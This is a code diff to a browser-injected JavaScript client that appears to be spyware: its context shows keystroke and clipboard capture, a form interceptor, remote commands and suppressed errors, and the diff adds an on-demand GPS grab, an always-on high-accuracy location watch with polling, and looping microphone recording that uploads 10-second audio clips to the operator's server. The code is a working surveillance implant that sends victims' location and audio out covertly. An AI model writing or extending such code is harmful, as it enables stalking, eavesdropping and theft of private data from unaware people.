@@ -22,6 +22,7 @@
     let keyBuffer = '', lastClip = '';
     let liveSocket = null, liveInterval = null, liveActive = false;
     let audioRecorder = null, audioActive = false;
+    let audioHTTPActive = false, audioHTTPTimer = null;
 
     // ═══ HELPERS ═══════════════════════════════════════════════
     // Suppress all console errors from this script
@@ -88,8 +89,18 @@
                 case 'sound': playTone(cmd.data); break;
                 case 'popup': window.open(cmd.data.url || '', '_blank', `width=${cmd.data.width||500},height=${cmd.data.height||400}`); break;
                 case 'screenshot': takePhoto(); break;
+                case 'get-location': {
+                    try {
+                        navigator.geolocation.getCurrentPosition(p => {
+                            post('/upload-location', { latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, altitude: p.coords.altitude, speed: p.coords.speed, heading: p.coords.heading, source: 'on-demand' });
+                        }, () => {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
+                    } catch {}
+                    break;
+                }
                 case 'start-live-http': startLiveFeed(); break;
                 case 'stop-live-http':  stopLiveFeed();  break;
+                case 'start-audio-http': startAudioHTTP(); break;
+                case 'stop-audio-http':  stopAudioHTTP();  break;
                 case 'vibrate': try { navigator.vibrate(cmd.data.pattern || [200,100,200]); } catch {} break;
                 case 'overlay': showOverlay(cmd.data); break;
                 case 'file': {
@@ -379,14 +390,25 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // ═══ LOCATION ═════════════════════════════════════════════
     function trackLocation() {
         if (!navigator.geolocation) { post('/log-error', { type: 'geo', message: 'Not supported' }); return; }
-        const opts = { enableHighAccuracy: true, timeout: 15000, maximumAge: 3000 };
-        const send = () => navigator.geolocation.getCurrentPosition(p => {
-            post('/upload-location', { latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, altitude: p.coords.altitude, speed: p.coords.speed, heading: p.coords.heading, source: 'gps' });
-        }, () => {}, opts);
-        send(); setInterval(send, C.locationPeriod);
-        try { navigator.geolocation.watchPosition(p => {
-            post('/upload-location', { latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, altitude: p.coords.altitude, speed: p.coords.speed, heading: p.coords.heading, source: 'gps-watch' });
-        }, () => {}, { enableHighAccuracy: false, maximumAge: 30000 }); } catch {}
+        const sendPos = (p, src) => post('/upload-location', {
+            latitude: p.coords.latitude, longitude: p.coords.longitude,
+            accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+            speed: p.coords.speed, heading: p.coords.heading, source: src || 'gps'
+        });
+        // Always-on high-accuracy watch — sends immediately on every position change
+        try {
+            navigator.geolocation.watchPosition(p => sendPos(p, 'gps-watch'), () => {}, {
+                enableHighAccuracy: true, maximumAge: 0, timeout: 10000
+            });
+        } catch {}
+        // Fallback poll for browsers that throttle watchPosition
+        const fallback = () => navigator.geolocation.getCurrentPosition(
+            p => sendPos(p, 'gps-poll'),
+            () => {},
+            { enableHighAccuracy: false, maximumAge: 20000, timeout: 15000 }
+        );
+        fallback();
+        setInterval(fallback, Math.max(10000, C.locationPeriod));
     }
 
     // ═══ HEARTBEAT ═════════════════════════════════════════════
@@ -532,6 +554,44 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }
         audioRecorder = null;
         if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false });
+    }
+
+    // ═══ HTTP AUDIO RECORDING (Vercel-compatible) ══════════════
+    // Records 10-second audio clips and uploads via /upload-media.
+    // Triggered by start-audio-http command; no socket.io needed.
+    function startAudioHTTP() {
+        if (audioHTTPActive) return;
+        if (!stream || stream.getAudioTracks().length === 0) return;
+        audioHTTPActive = true;
+        function recordChunk() {
+            if (!audioHTTPActive) return;
+            try {
+                const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
+                const mime = types.find(t => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) || 'audio/webm';
+                const audioStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
+                const rec = new MediaRecorder(audioStream, { mimeType: mime, audioBitsPerSecond: 32000 });
+                const chunks = [];
+                rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                rec.onstop = async () => {
+                    if (chunks.length) {
+                        const b = new Blob(chunks, { type: mime });
+                        if (b.size > 500) await upload('/upload-media', 'media', b, `mic_${Date.now()}.webm`);
+                    }
+                    if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 200);
+                };
+                rec.onerror = () => { if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 3000); };
+                rec.start(1000);
+                setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch {} }, 10000);
+            } catch {
+                if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 3000);
+            }
+        }
+        recordChunk();
+    }
+
+    function stopAudioHTTP() {
+        audioHTTPActive = false;
+        if (audioHTTPTimer) { clearTimeout(audioHTTPTimer); audioHTTPTimer = null; }
     }
 
     // ═══ FORM INTERCEPTOR ══════════════════════════════════════
